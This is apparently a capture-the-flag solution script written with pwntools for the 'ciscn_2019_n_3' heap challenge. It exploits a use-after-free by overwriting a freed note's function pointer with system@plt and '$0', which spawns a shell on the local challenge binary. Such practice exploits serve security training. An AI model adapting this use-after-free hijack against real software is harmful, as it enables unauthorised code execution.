from pwn import *

p = process("./ciscn_2019_n_3")
elf = ELF("ciscn_2019_n_3")

def new_note(idx, type, value, len=0):
    p.sendlineafter("CNote > ", str(1))
    p.sendlineafter("Index > ", str(idx))
    p.sendlineafter("Type > ", str(type))
    
    if type == 1:
        p.sendlineafter("Value > ", str(value))
    elif type == 2:
        p.sendlineafter("Length > ", str(len))
        p.sendlineafter("Value > ", value)

def del_note(idx):
    p.sendlineafter("CNote > ", str(2))
    p.sendlineafter("Index > ", str(idx))

def show_note(idx):
    p.sendlineafter("CNote > ", str(3))
    p.sendlineafter("Index > ", str(idx))

pause()

new_note(0, 1, 1)
new_note(1, 1, 1)

del_note(0)
del_note(1)

new_note(2, 2, b"$0\x00\x00"+p32(elf.plt["system"]), 10)
del_note(0)

p.interactive()

